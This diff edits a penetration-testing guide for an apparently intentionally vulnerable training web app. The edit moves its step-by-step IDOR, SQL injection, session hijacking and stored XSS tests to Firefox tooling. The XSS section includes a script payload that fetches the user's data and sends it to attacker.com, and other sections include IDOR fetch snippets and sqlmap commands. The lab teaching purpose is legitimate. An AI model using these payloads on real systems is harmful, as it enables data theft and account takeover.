@@ -43,50 +43,57 @@ Insecure Direct Object Reference (IDOR) occurs when an application exposes direc
 
 ### How to Test This Vulnerability
 
-#### Step 1: Login as First Customer
-1. Navigate to `/login`
-2. Login as **thepubco** / **welcome123**
-3. Go to "My Orders" in the sidebar
+#### Step 1: Login as First Customer and Capture Order IDs
+1. Open **Firefox** and press **F12** to open Firefox Developer Tools
+2. Go to the **Network** tab
+3. Navigate to `/login` and login as **thepubco** / **welcome123**
+4. Click "My Orders" in the sidebar
 
-#### Step 2: Note Your Orders
-You'll see 3 orders:
-- **MFF-1000** (Delivered)
-- **MFF-1001** (Delivered)
-- **MFF-1002** (Confirmed)
-
-#### Step 3: Get Order Details
-1. Open Browser DevTools (F12)
-2. Go to the Network tab
-3. Click on one of your orders
-4. Observe the API request: `GET /api/orders/{order-id}`
-5. Note the **order ID** (a UUID like `abc123-def456-...`)
-
-#### Step 4: Logout and Login as Different Customer
-1. Logout
-2. Login as **bella_italia** / **pasta2024**
-3. You'll see their orders (**MFF-1003**, **MFF-1004**, etc.)
-
-#### Step 5: Access First Customer's Order
-**Using Browser DevTools:**
-1. Open Console tab
-2. Run this JavaScript:
-```javascript
-fetch('/api/orders/{paste-thepubco-order-id-here}')
-  .then(r => r.json())
-  .then(console.log)
+#### Step 2: Extract Order IDs from API Response
+1. In the Network tab, find the request to `/api/orders`
+2. Click on it and select the **Response** tab
+3. You'll see JSON containing your 3 orders with their UUIDs:
+```json
+[
+  {"id": "abc123-def456-...", "orderNumber": "MFF-1000", ...},
+  {"id": "xyz789-uvw012-...", "orderNumber": "MFF-1001", ...},
+  {"id": "pqr345-stu678-...", "orderNumber": "MFF-1002", ...}
+]
 ```
+4. **Copy one of the order IDs** (the UUID, not the order number)
 
-**Using Burp Suite:**
-1. Intercept request to `/api/orders/{bella-order-id}`
-2. Change the order ID to thepubco's order ID
-3. Forward the request
-4. Observe: You can view another customer's order!
+#### Step 3: Logout and Login as Different Customer
+1. Click **Logout** in the sidebar
+2. Login as **bella_italia** / **pasta2024**
+3. Navigate to "My Orders" - you'll see different orders (MFF-1003, MFF-1004, etc.)
 
-**Using curl:**
+#### Step 4: Access First Customer's Order (The IDOR Attack!)
+
+**Method A: Using Firefox Developer Tools Console**
+1. Press **F12** to open Firefox Developer Tools
+2. Go to the **Console** tab
+3. Run this JavaScript (paste thepubco's order UUID):
+```javascript
+fetch('/api/orders/PASTE_THEPUBCO_ORDER_UUID_HERE')
+  .then(r => r.json())
+  .then(data => console.log('STOLEN ORDER:', data))
+```
+4. You'll see thepubco's order details even though you're logged in as bella_italia!
+
+**Method B: Using Burp Suite**
+1. Configure Firefox to use Burp as proxy (127.0.0.1:8080)
+2. In Burp, go to Proxy > Intercept
+3. In Firefox, refresh the My Orders page
+4. Intercept the request to `/api/orders`
+5. Send to Repeater (Ctrl+R)
+6. Change the URL to `/api/orders/THEPUBCO_ORDER_UUID`
+7. Click Send - observe unauthorised access to another customer's order!
+
+**Method C: Using curl**
 ```bash
-# Get your session cookie first (from Browser DevTools > Application > Cookies)
+# Get your session cookie from Firefox Developer Tools > Storage > Cookies
 curl -H "Cookie: connect.sid=your-session-cookie" \
-  http://localhost:5000/api/orders/{thepubco-order-id}
+  http://localhost:5000/api/orders/THEPUBCO_ORDER_UUID
 ```
 
 ### Expected Result
@@ -134,8 +141,8 @@ SQL Injection occurs when untrusted user input is inserted into SQL queries with
 #### Method 1: Manual Testing (Easiest)
 
 **Step 1: Navigate to Login Page**
-1. Go to `/login`
-2. Open Browser DevTools (F12) > Console tab to observe any errors
+1. Open **Firefox** and go to `/login`
+2. Press **F12** to open Firefox Developer Tools > Console tab to observe any errors
 
 **Step 2: Try Authentication Bypass Payload**
 In the **username** field, enter:
@@ -365,7 +372,7 @@ This application contains 15 intentional security vulnerabilities organized by s
 #### 5. Insecure Direct Object Reference (IDOR)
 **Locations**: `/api/orders/:id`, `/api/profile/:userId`  
 **Test**: Login as one customer, capture order ID, login as different customer, access first customer's order ID  
-**Tools**: Burp Suite Repeater, browser DevTools  
+**Tools**: Burp Suite Repeater, Firefox Developer Tools  
 **Impact**: Unauthorised access to other users' sensitive data  
 **OWASP**: A01:2021 - Broken Access Control
 
@@ -482,10 +489,20 @@ This section provides detailed setup and usage instructions for the most effecti
 **Purpose**: HTTP request interception, manipulation, and repeating  
 **Best for**: IDOR testing, session analysis, CSRF testing, manual SQL injection
 
-**Setup:**
+**Setup for Firefox:**
 1. Download from [portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
-2. Configure your browser proxy to `127.0.0.1:8080`
-3. Import Burp's CA certificate to avoid SSL warnings
+2. **Configure Firefox proxy:**
+   - Open Firefox Settings (about:preferences)
+   - Scroll to Network Settings → Click "Settings..."
+   - Select "Manual proxy configuration"
+   - HTTP Proxy: `127.0.0.1` Port: `8080`
+   - Check "Also use this proxy for HTTPS"
+   - Click OK
+3. **Import Burp's CA certificate in Firefox:**
+   - In Burp, go to Proxy → Options → Import/Export CA Certificate
+   - Export Certificate in DER format
+   - In Firefox: Settings → Privacy & Security → Certificates → View Certificates
+   - Import → Select the certificate → Check "Trust this CA to identify websites"
 
 **Testing Manchester Fresh Foods:**
 
@@ -493,11 +510,12 @@ This section provides detailed setup and usage instructions for the most effecti
 ```
 1. Proxy → Intercept: ON
 2. Login as thepubco and navigate to My Orders
-3. Click on an order (note the UUID in the request)
-4. Right-click request → Send to Repeater
-5. Logout, login as bella_italia
-6. In Repeater, change the order UUID to thepubco's order
-7. Click Send - observe unauthorized access!
+3. Observe the GET /api/orders request in Burp's HTTP History
+4. Note the order UUIDs in the JSON response
+5. Right-click request → Send to Repeater
+6. Logout, login as bella_italia
+7. In Repeater, change URL to /api/orders/THEPUBCO_ORDER_UUID
+8. Click Send - observe unauthorised access to another user's order!
 ```
 
 **Example 2: SQL Injection Testing**
@@ -550,9 +568,10 @@ brew install --cask owasp-zap
 
 **Manual Explore + Active Scan (Recommended):**
 ```
-1. HUD Mode: Firefox/Chrome with ZAP browser extension
-2. Manually browse the application while logged in
-3. ZAP will automatically discover all endpoints
+1. HUD Mode: Install ZAP's Firefox extension (HUD)
+2. Configure Firefox to use ZAP as proxy (127.0.0.1:8080)
+3. Manually browse the application while logged in
+4. ZAP will automatically discover all endpoints
 4. Right-click site → Attack → Active Scan
 5. Export report: Report → Generate HTML Report
 ```
@@ -634,7 +653,7 @@ sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
 **Test 3: Order IDOR + SQL Injection**
 ```bash
 # First, get a valid session cookie by logging in
-# Copy connect.sid value from browser DevTools
+# Copy connect.sid value from Firefox Developer Tools (Storage > Cookies)
 
 sqlmap -u "http://localhost:5000/api/orders/ORDER_UUID_HERE" \
   --cookie="connect.sid=YOUR_SESSION_COOKIE" \
@@ -704,33 +723,41 @@ nikto -h http://localhost:5000 -o nikto-report.html -Format html
 
 ---
 
-### 5. Browser Extensions for Penetration Testing
+### 5. Firefox Extensions for Penetration Testing
 
-**Cookie Editor (Chrome/Firefox)**
+**Cookie Editor (Firefox)**
 - **Purpose**: Manipulate session cookies for hijacking tests
-- **Install**: Chrome Web Store / Firefox Add-ons
+- **Install**: [Firefox Add-ons - Cookie Editor](https://addons.mozilla.org/en-GB/firefox/addon/cookie-editor/)
 - **Use case**: Change session ID to hijack another user's session
 
-**Example:**
+**Example - Session Hijacking:**
 ```
-1. Login as thepubco
-2. Open Cookie Editor
-3. Note session cookie: connect.sid=sess_1000_1699876543
-4. Increment counter: sess_1001_1699876543
-5. Refresh page → You've hijacked bella_italia's session!
+1. Login as thepubco in Firefox
+2. Click the Cookie Editor icon in toolbar
+3. Find cookie: connect.sid=sess_1000_1699876543
+4. Edit the value, increment counter: sess_1001_1699876543
+5. Click Save, then refresh page
+6. Result: You've hijacked bella_italia's session!
 ```
 
-**EditThisCookie (Chrome)**
-- Similar functionality to Cookie Editor
-- Export/import cookies for session replay
+**Cookie Quick Manager (Firefox)**
+- **Install**: [Firefox Add-ons - Cookie Quick Manager](https://addons.mozilla.org/en-GB/firefox/addon/cookie-quick-manager/)
+- Similar functionality with export/import for session replay
+- View all cookies in a searchable interface
 
-**Wappalyzer**
+**Wappalyzer (Firefox)**
+- **Install**: [Firefox Add-ons - Wappalyzer](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/)
 - **Purpose**: Technology detection
-- **Expected results**: React, Express.js, Tailwind CSS
+- **Expected results for MFF**: React, Express.js, Tailwind CSS, Node.js
 
-**FoxyProxy**
+**FoxyProxy Standard (Firefox)**
+- **Install**: [Firefox Add-ons - FoxyProxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/)
 - **Purpose**: Quick proxy switching for Burp Suite/ZAP
-- **Setup**: Add proxy profile for 127.0.0.1:8080
+- **Setup**: 
+  1. Click FoxyProxy icon → Options
+  2. Add new proxy: Title "Burp", Host "127.0.0.1", Port "8080"
+  3. Click FoxyProxy icon → Select "Burp" to enable proxy
+  4. Select "Disable FoxyProxy" to browse normally
 
 ---
 
@@ -801,20 +828,32 @@ done
 
 ---
 
-### 7. Browser DevTools (Built-in)
+### 7. Firefox Developer Tools (Built-in)
+
+**How to Open**: Press **F12** or right-click → "Inspect"
 
 **Purpose**: Client-side testing, JavaScript analysis, network inspection  
 **Best for**: XSS testing, session analysis, exposed secrets
 
+**Firefox DevTools Tabs:**
+- **Inspector**: View and edit HTML/CSS (like Chrome's Elements)
+- **Console**: Execute JavaScript, view errors and logs
+- **Debugger**: View JavaScript source files (like Chrome's Sources)
+- **Network**: Monitor HTTP requests and responses
+- **Storage**: View cookies, localStorage, sessionStorage (like Chrome's Application)
+
 **Manchester Fresh Foods Examples:**
 
 **Test 1: Stored XSS**
-```javascript
-// Open DevTools Console on /dashboard/profile
-// Inject payload into bio field:
-<img src=x onerror=alert('XSS')>
+```
+1. Navigate to /dashboard/profile in Firefox
+2. Press F12 to open Developer Tools
+3. In the bio field, enter this payload:
+   <img src=x onerror=alert('XSS')>
+4. Save the profile
+5. Refresh the page - observe the XSS alert!
 
-// Or more dangerous:
+More dangerous payload (credential theft):
 <script>
   fetch('/api/user').then(r=>r.json()).then(u=>
     fetch('https://attacker.com/steal?data='+JSON.stringify(u))
@@ -823,40 +862,61 @@ done
 ```
 
 **Test 2: Session Cookie Analysis**
-```javascript
-// Console tab
-document.cookie  // View session cookie
+```
+1. Press F12 to open Firefox Developer Tools
+2. Go to the Storage tab
+3. Expand Cookies → http://localhost:5000
+4. Find the connect.sid cookie
+5. Check for security issues:
+   ❌ Missing HttpOnly flag (allows JavaScript access)
+   ❌ Missing Secure flag (sent over HTTP)
+   ❌ Missing SameSite attribute (CSRF vulnerable)
+   ❌ Predictable session ID pattern (sess_1000_timestamp)
 
-// Application tab → Cookies
-// Check for:
-// ❌ Missing HttpOnly flag
-// ❌ Missing Secure flag  
-// ❌ Missing SameSite attribute
-// ❌ Predictable session ID pattern
+Alternative - Console tab:
+document.cookie  // If HttpOnly is missing, cookie is visible here!
 ```
 
 **Test 3: Exposed Secrets in Source Code**
-```javascript
-// Sources tab → Search (Ctrl+Shift+F)
-// Search for:
-"api_key"
-"secret"
-"password"
-"token"
-"SESSION_SECRET"
+```
+1. Press F12 to open Firefox Developer Tools
+2. Go to the Debugger tab
+3. Press Ctrl+Shift+F to open "Search in all files"
+4. Search for sensitive keywords:
+   - "api_key"
+   - "secret"
+   - "password"
+   - "token"
+   - "SESSION_SECRET"
+5. Check for exposed credentials in JavaScript bundles
 ```
 
 **Test 4: IDOR via Console**
 ```javascript
-// Get another user's order
+// Press F12, go to Console tab
+// Paste and run these commands:
+
+// Get another user's order (replace UUID with one captured earlier)
 fetch('/api/orders/UUID_FROM_OTHER_USER')
   .then(r => r.json())
-  .then(console.log)
+  .then(data => console.log('STOLEN ORDER:', data))
 
 // Get another user's profile  
 fetch('/api/profile/DIFFERENT_USER_ID')
   .then(r => r.json())
-  .then(console.log)
+  .then(data => console.log('STOLEN PROFILE:', data))
+```
+
+**Test 5: Network Tab Analysis**
+```
+1. Press F12, go to Network tab
+2. Navigate around the application
+3. Look for:
+   - API endpoints being called (filter by XHR)
+   - Sensitive data in responses
+   - Session tokens in headers
+   - Unencrypted data transmission
+4. Right-click any request → "Edit and Resend" to modify and replay
 ```
 
 ---
@@ -896,7 +956,7 @@ Match each vulnerability to the best testing tool:
 | Vulnerability | Primary Tool | Alternative Tools |
 |--------------|--------------|-------------------|
 | **SQL Injection** | SQLmap, Burp Intruder | curl, ZAP, Manual (DevTools) |
-| **Stored XSS** | Browser DevTools, Burp | ZAP, Manual testing |
+| **Stored XSS** | Firefox Developer Tools, Burp | ZAP, Manual testing |
 | **IDOR** | Burp Repeater, curl | Postman, DevTools Console |
 | **Weak Passwords** | Burp Intruder, Hydra | Custom Python script |
 | **Session Hijacking** | Cookie Editor, Burp | EditThisCookie, curl |
@@ -909,7 +969,7 @@ Match each vulnerability to the best testing tool:
 | **Plaintext Passwords** | SQLmap (dump users) | Burp (observe responses) |
 | **Predictable Sessions** | Burp Sequencer | Cookie Editor + manual |
 | **Verbose Errors** | ZAP, Nikto | Any tool (trigger errors) |
-| **Exposed Secrets** | Browser DevTools Sources | grep source files |
+| **Exposed Secrets** | Firefox Developer Tools Debugger | grep source files |
 
 ---
 
